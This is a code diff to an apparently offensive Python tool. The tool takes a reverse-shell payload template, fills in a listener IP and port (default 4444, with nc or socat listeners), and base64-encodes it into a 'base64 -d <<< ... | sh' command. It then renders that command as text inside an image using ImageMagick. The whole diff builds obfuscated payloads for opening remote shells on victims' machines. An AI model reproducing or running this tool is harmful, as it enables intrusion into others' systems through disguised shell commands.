@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 import os
 import argparse
+import base64
+from PIL import Image, ImageDraw
 
 
 class bcolors:
@@ -44,13 +46,13 @@ help_str += "  [-] socat_TTY\n" + bcolors.ENDC
 parser.add_argument('-l','--listener', help=help_str)
 
 # name of the image file to be supplied for modification
-parser.add_argument('-f','--file', help=bcolors.GREEN +'Name'+bcolors.ENDC+' of the image file to modify', required=True)
+parser.add_argument('-o','--output', help=bcolors.GREEN +'Name'+bcolors.ENDC+' of the image file to create', required=True)
 
 # Port argument, I usually use 4444 so this is why this is the default
 parser.add_argument('-p','--port', help=bcolors.GREEN +'Port'+bcolors.ENDC+' that you wish to use for the listener (default: 4444)')
 
 # text file to be converted
-parser.add_argument('-pf','--payload-file', help=bcolors.GREEN +'text file'+bcolors.ENDC+'to convert, use '+bcolors.WARNING +'^IP^'+bcolors.ENDC+' and '+bcolors.WARNING +'^PORT^'+bcolors.ENDC+' to define the IP and Port positions', required=True)
+parser.add_argument('-pf','--payload', help=bcolors.GREEN +'text file'+bcolors.ENDC+'to convert, use '+bcolors.WARNING +'^IP^'+bcolors.ENDC+' and '+bcolors.WARNING +'^PORT^'+bcolors.ENDC+' to define the IP and Port positions', required=True)
 
 # font choice
 parser.add_argument("-fo", "--font", help=bcolors.GREEN +'Font'+bcolors.ENDC+" to be used for the text in the image (default: helvetica)")
@@ -65,7 +67,8 @@ def Parse_args():
     else:
         listener = "nc"
 
-    OutputFileName = args["file"]
+    OutputFileName = args["output"]
+    payload_file = args["payload"]
 
     if args["port"]:
         Port = args["port"]
@@ -75,10 +78,34 @@ def Parse_args():
     if args["font"]:
         font_choice = args["font"]
     else:
-        font_choice = "helvetica"
+        font_choice = "Fira Code Medium"
 
-    return IP, Port, OutputFileName, payload_file, listener, font
+    return IP, Port, OutputFileName, payload_file, listener, font_choice
 
 if __name__ =="__main__":
     print(header)
     IP, Port, OutputFileName, payload_file, Listener, font = Parse_args()
+
+    print_with_colors("Current configuration\n=====================================", bcolors.GREEN)
+    print(bcolors.GREEN + "[+] listener ip: {}".format(bcolors.WARNING+IP+bcolors.ENDC) +bcolors.ENDC)
+    print(bcolors.GREEN + "[+] listener port: {}".format(bcolors.WARNING+Port+bcolors.ENDC) +bcolors.ENDC)
+    print(bcolors.GREEN + "[+] Output file: {}".format(bcolors.WARNING+OutputFileName+bcolors.ENDC) +bcolors.ENDC)
+    print(bcolors.GREEN + "[+] Payload text file: {}".format(bcolors.WARNING+payload_file+bcolors.ENDC) +bcolors.ENDC)
+    print(bcolors.GREEN + "[+] Listener: {}".format(bcolors.WARNING+Listener+bcolors.ENDC) +bcolors.ENDC)
+    print(bcolors.GREEN + "[+] font: {}".format(bcolors.WARNING+font+bcolors.ENDC) +bcolors.ENDC)
+    print_with_colors("=====================================\n", bcolors.GREEN)
+
+    with open(payload_file) as PLF:
+        payload = PLF.read()
+        payload = payload.replace("^IP^","{}".format(IP)).replace("^PORT^","{}".format(Port))
+        print_with_colors("---> payload: \n{}".format(bcolors.WARNING + payload + bcolors.ENDC), bcolors.CYAN)
+        b64_payload = "base64 -d <<< ".encode() + base64.b64encode(payload.encode()) + "| sh".encode()
+        print_with_colors("\n---> encoded payload: ", bcolors.CYAN)
+        print(bcolors.WARNING + b64_payload.decode() + bcolors.ENDC)
+
+    img = Image.new('RGB', (len(b64_payload) * 30, 100), color = 'black')
+    img.save('black.jpg')
+
+    str_convert = "convert -font {}, -pointsize 50 -fill white -draw \"text 25,70 '{}'\" black.jpg {}".format(font, b64_payload, OutputFileName).replace('\'b\'','\'').replace('sh\'\'','sh\'')
+    os.system(str_convert)
+    os.system("rm black.jpg")
